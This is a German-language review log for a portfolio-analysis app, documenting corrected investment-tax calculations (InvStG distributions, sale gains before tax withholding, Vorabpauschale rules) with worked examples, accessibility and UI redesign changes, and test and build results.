Befunde einer zweiten Prüfung des Stands nach der Nachkontrolle. Jede fachliche Änderung hat einen Unit-Test mit ausgeschriebener Rechnung. Die Werte „alt“ stammen aus einer Probe gegen den Code vor der Nachbesserung. Gegenprobe am 07.10.2026: Setzt man jeweils die alte Rechenregel wieder ein, schlagen die neuen Tests fehl (Verkauf ohne Steuer im Erlös: 2 Tests in `positions.test.ts`; Ausschüttungen auf den Bestand am 31.12. verteilt: 3 Tests in `distributions.test.ts`; Kurse auch ohne Bestand am 31.12. verlangt: 4 Tests in `tax-prefill.test.ts`; Drawdown-Hinweis als Datumsbereich: 1 Test in `kpis.test.ts`); mit der neuen Regel sind alle grün.

### Ausschüttungen je Anteil zum Zahltag (§ 18 Abs. 1, § 2 Abs. 11 InvStG)

Bisher verteilte `tax/positions.ts` die Ausschüttungen des Jahres gleichmäßig auf den Bestand am 31.12. (`distributionsInYear / Stück am Jahresende`). Nach einem Teilverkauf wurden dadurch auch die Ausschüttungen auf verkaufte Anteile den verbliebenen Anteilen gutgeschrieben, nach einem Nachkauf erhielten die neuen Anteile einen Teil der früheren Ausschüttung. Neu: Jede Ausschüttung im Steuerjahr wird brutto durch die Stückzahl der Buchung geteilt (ohne Stückzahl: durch die am Zahltag gehaltenen Anteile) und jeder Tranche gutgeschrieben, die am Zahltag im Bestand ist (`distributionsPerShareInYear` in `tax/fifo.ts`). Die Vorabpauschale je Teil rechnet mit Stück × Ausschüttung je Anteil dieser Tranchen. Zur Lesart bei Nachkauf nach einer Ausschüttung siehe „Zu verifizieren“, Punkt 6.

| Fall (Kurs 100 → 110, Basiszins 3,2 %, Aktienfonds) | alt | neu | Handrechnung neu |
|---|---|---|---|
| 200 Anteile aus 2025, 200 € Ausschüttung im März, Verkauf von 100 Anteilen im Juni | 24,00 € | 124,00 € | 200 / 200 = 1,00 € je Anteil; 100 × (100 × 3,2 % × 0,7 − 1,00) = 124,00 |
| derselbe Fall ohne Stückzahl in der Ausschüttungsbuchung | 24,00 € | 124,00 € | 200 € / 200 gehaltene Anteile = 1,00 € |
| 100 Anteile aus 2025, 100 € Ausschüttung im März, Kauf von 100 Anteilen im September | 174,00 + 58,00 = 232,00 € | 198,67 € | Bestand 100 × (2,24 − 1,00) = 124,00; Septemberkauf 100 × 2,24 × 4/12 = 74,67 |
| Januarkauf 100 Anteile, Ausschüttung 73,63 € netto plus 26,37 € Steuerabzug | 124,00 € | 124,00 € | (73,63 + 26,37) / 100 = 1,00 € je Anteil; 100 × (2,24 − 1,00) |

Steuerreiter und PDF nennen weiter die Ausschüttungen des Jahres brutto; entfällt ein Teil auf Anteile, die am 31.12. nicht mehr oder noch nicht im Bestand sind, steht dahinter „davon … auf Anteile im Bestand am 31.12. (mindern den Basisertrag)“. Tests: `distributions.test.ts`, Abschnitt „Ausschüttungen je Anteil zum Zahltag“.

### Veräußerungsgewinn vor Steuerabzug (§ 20 Abs. 4 EStG)

Bisher ging bei Verkäufen nur `|amount|` als Erlös in die FIFO-Rechnung ein. DepotDoktor behandelt `amount` als Zahlungseingang nach Gebühr und Steuerabzug (wie bei Ausschüttungen); die abgeführte Steuer minderte damit den Gewinn, obwohl sie keine Veräußerungskost ist. Neu: Erlös = `|amount| + |tax|`. Die Kachel „Verkaufserlöse“ im Performance-Reiter bleibt der Zahlungseingang, die Steuer steht weiter unter „Abgeführte Steuern“.

| Fall | alt | neu | Handrechnung neu |
|---|---|---|---|
| Kauf 10 @ 100 mit 1 € Gebühr (1.001 €), Verkauf 4 @ 120 mit 1 € Gebühr und 20 € Steuerabzug (Buchung 459 €) | Erlös 459,00 €, Gewinn 58,60 € | Erlös 479,00 €, Gewinn 78,60 € | 459 + 20 = 479; 479 − 4 × 100,10 = 78,60 |
| derselbe Verkauf ohne Steuerabzug (Testdateien) | 78,60 € | 78,60 € | unverändert |

Tests: `positions.test.ts`, Abschnitt „Veräußerungsgewinn mit Steuerabzug beim Verkauf“. Offener Prüfpunkt: „Zu verifizieren an echten Exporten“, Punkt 6 (auch das Vorzeichen einer Steuererstattung).

### Kein Bestand am 31.12.: keine Vorabpauschale

Seit der Nachkontrolle setzten fehlende Kurse alle Steuerkacheln auf „–“. Ein Fonds, der im Jahr gekauft und vor dem 31.12. ganz verkauft wurde, hat keinen Kurs vom Vorjahr; er verlangte deshalb Kurse und verdeckte das Ergebnis der übrigen Positionen, obwohl seine Vorabpauschale feststeht. Die Vorabpauschale gilt erst am ersten Werktag des Folgejahres als zugeflossen (§ 18 Abs. 3 InvStG), ohne Bestand am 31.12. fällt also keine an. Neu in `tax/summary.ts`: Ohne Bestand am 31.12. ist die Zeile `notApplicable` (wie „kein Fonds“), die Schätzung ist 0 ohne Teile, und Steuerreiter und PDF zeigen „Keine Vorabpauschale: kein Bestand am 31.12.<Jahr> (§ 18 Abs. 3 InvStG).“ statt „Kurse eintragen“. Vorbelegte Kurse solcher Positionen sind nicht mehr als „vorläufig“ gekennzeichnet. Verkäufe und Gewinne erscheinen unverändert.

| Fall, Steuerjahr 2026 | alt | neu |
|---|---|---|
| Kauf 10 @ 100 am 10.02.2026, Verkauf 10 @ 110 am 20.05.2026 | „missing“, Kacheln „–“ und „Kurse eintragen“ | 0,00 €, vollständig; Gewinn 10 × (110 − 100) = 100,00 € |
| derselbe Fonds neben einem Fonds aus 2025 mit Nachkauf 1 @ 110 im Mai | Kacheln „–“ | vorläufig 23,89 € (10 × 100 × 3,2 % × 0,7 = 22,40 plus 1 × 2,24 × 8/12 = 1,4933) |
| Bestand 10 @ 100 aus 2025, im Mai 2026 ganz verkauft @ 120 | „vorläufig“, 0,00 € | 0,00 €, vollständig; Gewinn 200,00 € |

Tests: `tax-prefill.test.ts`, Abschnitt „Kein Bestand am 31.12.“, dazu der E2E-Test „Angesetzte Vorabpauschalen mindern den Veräußerungsgewinn …“ (Hinweistext, Kachel 0,00 €, kein „vorläufig“).

### Max Drawdown am Kauftag

Seit der Nachkontrolle beginnt der Index vor dem ersten Kauf bei 1. Besteht der größte Rückgang nur aus dem Kauftag selbst (Wert nach dem Kauf unter dem gezahlten Betrag, meist die Kaufgebühr), lauteten Kachel und PDF „06.01.2026 → 06.01.2026“. Neu (`kpis.ts`): Bei gleichem Datum steht „am 06.01.2026 (Kauftag)“. Rechenwert unverändert. Test in `kpis.test.ts`: Kauf 100 @ 80 für 8.001 €, Teilverkauf mit Gewinn; 1 − 8000/8001 = 0,0125 % („−0,01 %“). Gleiche Tage entstehen nur bei Perioden, die ohne Bestand mit einem Zufluss beginnen, also an Kauftagen.

### Zugänglichkeit im Steuerreiter

Der Hinweis „Der Scalable-Export unterscheidet nicht zwischen Aktie und Fonds. Bitte prüfen Sie den Fondstyp.“ hängt über `aria-describedby` am Auswahlfeld „Fondstyp“, die Meldung „Kurse eintragen: …“ an beiden Kursfeldern, solange keine Schätzung möglich ist (beim Kursfeld mit vorbelegtem Wert nach „vorläufig (Kurs aus dem Export)“). E2E: Scalable-Test (`toHaveAccessibleDescription` am Fondstyp beider Positionen) und Beispieldatei im Steuerreiter (Beschreibung vor und nach der Kurseingabe).

### Texte

- `README.md`: CSP-Aussage auf Hintergrundanfragen, Subressourcen und Formulare begrenzt; externe Links sind ausgenommen. Klammern in der Allokationszeile aufgelöst, Anführungszeichen beim BaFin-Merkblatt korrigiert.
- Diese Datei: Kopfzeile verlinkt kein Repository (Abschnitt „Texte zu Quellcode und Startseite“), CSP-Aussage im Abschnitt „Gesamtprüfung 06.09.2026“ präzisiert, Quelle des Zwölftelungsfalls „über Jahresgrenze“ korrigiert (`positions.test.ts`, nicht die Trade-Republic-Testdatei).

### Prüfergebnisse der Nachbesserung

Lokal unter Windows 11 mit Node 22.23.2, pnpm 10.34.5 und Chromium Headless Shell 1234, E2E mit `CI=true` gegen `next start` auf Port 3000.

| Schritt | Ergebnis |
|---|---|
| `pnpm install --frozen-lockfile` | grün |
| `pnpm typecheck` (einschließlich E2E-Dateien) | grün |
| `pnpm lint` (alle sechs Pakete) | grün |
| `pnpm test` | 235 Tests grün (csv 50, pdf 2, web 183) und 1 offener `todo` |
| `pnpm build` | grün |
| `pnpm test:e2e` mit `CI=true` | 28 Tests grün (`depotdoktor.spec.ts` 14, `site.spec.ts` 14), darin axe-core bei 390, 768 und 1280 px ohne Verstöße |

## Oberfläche „Navy & Gold“ 07.10.2026

Neugestaltung der Oberfläche (Kopf, Hero, Fuß, Startseite, Reiter, Kacheln, Tabellen, Rechtsseiten, Statusseiten, PDF-Farben) in der Familie mit KontoKlar und NetzRadar. Rechenwerte, Parser, Steuerlogik und Kennzahlen sind unverändert (`apps/web/lib/depotdoktor`, `packages/csv` und `packages/legal` ohne Änderung); Rechtstexte inhaltlich unverändert.

Nur die Darstellung betreffen:

- Kennzahl-Kacheln setzen die Einheit („%“, „€“, „% p. a.“) kleiner neben die Zahl. Der Text bleibt zeichengleich (`splitValueUnit` in `packages/ui/src/value-unit.ts`, Unit-Test `value-unit.test.ts`: Zahl und Einheit ergeben wieder den Ausgangswert). PDF und CSV sind nicht betroffen.
- Im Steuerreiter stehen in Normangaben, Beträgen mit „€“ und „%“ sowie in „1.000 € / 2.000 €“ geschützte Leerzeichen (`keepTogether` in `TaxTab.tsx`), damit „§“ und Zahl nicht getrennt umbrechen. Die Texte aus `tax/summary.ts` werden dafür nur bei der Anzeige umgesetzt.
- Fehlen Kurse, steht über den Steuerkacheln ein Hinweis mit Sprungmarke zur ersten Position ohne Kurs.
- Fehlermeldungen beim Einlesen stehen direkt unter der Ablagefläche und werden ins Bild gescrollt.

### Prüfergebnisse

Lokal unter Windows 11 mit Node 22.23.2, pnpm 10.34.5 und Chromium Headless Shell 1234, E2E mit `CI=true` gegen `next start` auf Port 3401.

| Schritt | Ergebnis |
|---|---|
| `pnpm install --frozen-lockfile` | grün |
| `pnpm typecheck` (einschließlich E2E-Dateien) | grün |
| `pnpm lint` (alle sechs Pakete) | grün |
| `pnpm test` | 238 Tests grün (csv 50, pdf 2, web 186) und 1 offener `todo` |
| `pnpm build` | grün |
| `pnpm test:e2e` mit `CI=true` | 29 Tests grün (`depotdoktor.spec.ts` 15, `site.spec.ts` 14), darin axe-core bei 390, 768 und 1280 px ohne Verstöße und die Reiter bei 320 px vollständig im Bild |

Die README-Screenshots (`docs/screenshots/performance.png`, `steuer.png`) sind neu erzeugt: Playwright gegen `next start`, Viewport 1280 px, Skalierung 1,5, Beispieldatei, im Steuerreiter Beispielkurse für den ETF (Kurs 01.01.2026: 80,00 €, Kurs 31.12.2026: 95,00 €).
